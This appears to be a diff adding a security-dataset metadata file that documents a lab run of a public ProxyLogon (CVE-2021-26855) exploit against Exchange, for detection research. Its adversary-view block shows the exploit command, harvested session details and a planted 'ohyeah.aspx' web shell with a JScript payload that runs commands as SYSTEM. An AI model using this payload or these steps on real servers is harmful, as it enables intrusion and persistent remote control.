@@ -1,0 +1,61 @@
+title: Exchange ProxyLogon SSRF RCE Vuln POC
+id: SDWIN-210314014019
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2021/03/14
+modification_date: 2021/03/14
+platform:
+- Windows
+type: atomic
+tags:
+description: This dataset represents the execution of a public POC to abuse Exchange vulnerabilities (CVE-2021-26855 server-side request forgery (SSRF) vulnerability)
+attack_mappings:
+  - technique: T1505
+    sub-technique: "003"
+    tactics:
+      - TA0003
+      - TA0002
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/proxylogon_ssrf_rce_poc.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: cmd
+      module: cmd
+      script:
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+      C:\Users\wardog.MXS01\Documents>
+      C:\Users\wardog.MXS01\Documents>python public-poc.py localhost wardog@azsentinel.local
+      Attacking target localhost
+      =============================
+      Got DN: /o=azsentinel/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=6beef80bd6d14a68b9ae39df7f27a8cc-wardog
+      Got SID: S-1-5-21-594047938-393122191-2580508586-500
+      Got session id: e243cd06-1093-40d4-829c-63f3b9caea9b
+      Got canary: pYoEXlKOqkGQMt3Dv3qJUExebVlG6NgI3c_XeQNd-VRV8lo6E5zskoLPJB0uOOGITLTC08eVUkk.
+      Got OAB id: becafe73-b0c1-4f36-8df4-85f682840ef4
+      Ready!
+
+      Testing command:
+      ===============
+      POST  shell:https://localhost/owa/auth/ohyeah.aspx
+      code":"Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").StdOut.ReadAll());
+
+
+      [*] Waiting for ohyeah.aspx to be available..
+      [*] Waiting for ohyeah.aspx to be available..
+
+      Results:
+      ========
+      nt authority\system
+
+
+      C:\Users\wardog.MXS01\Documents>
+references:
+  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
+  - https://twitter.com/jack_halon/status/1370192318377168897
+  - https://github.com/OTRF/Azure-Sentinel2Go/tree/master/grocery-list/Win10-AD-MXS
